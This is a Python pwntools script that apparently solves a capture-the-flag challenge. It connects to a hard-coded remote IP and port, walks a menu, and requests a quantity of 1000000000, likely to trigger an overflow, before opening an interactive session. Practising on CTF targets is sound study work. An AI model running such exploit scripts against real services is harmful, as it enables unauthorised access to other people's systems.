from pwn import *

context.log_level = "debug"
context(arch="amd64", os="linux")
context.terminal = ["tmux", "splitw", "-h"]


def p(s, m):
    if m == 0:
        io = process(s)
    else:
        if ":" in s:
            x = s.split(":")
            addr = x[0]
            port = int(x[1])
            io = remote(addr, port)
        elif " " in s:
            x = s.split(" ")
            addr = x[0]
            port = int(x[1])
            io = remote(addr, port)
        else:
            error(f"{s} may be some error")
    return io


def gg():
    gdb.attach(io)
    raw_input()


s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sla = lambda x, y: io.sendlineafter(x, y)
sl = lambda x: io.sendline(x)
rv = lambda x: io.recv(x)
ru = lambda x: io.recvuntil(x)
rvl = lambda: io.recvline()
lg = lambda x, y: log.info(f"\x1b[01;38;5;214m {x} => {hex(y)} \x1b[0m")
ia = lambda: io.interactive()
uu32 = lambda x: u32(x.ljust(4, b"\x00"))
uu64 = lambda x: u64(x.ljust(8, b"\x00"))
l32 = lambda: u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64 = lambda: u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))

# io = p("./pwn", 0)
io = p("106.14.191.23:51641", 1)

sla(b"Now your choice is:", b"2")
sla(b"Now your choice is:", b"4")

for _ in range(50):
    sla(b">>", b"1")

sla(b"Your choice:", b"1")
sla(b"how many?", b"1000000000")
sla(b"Your choice:", b"2")


ia()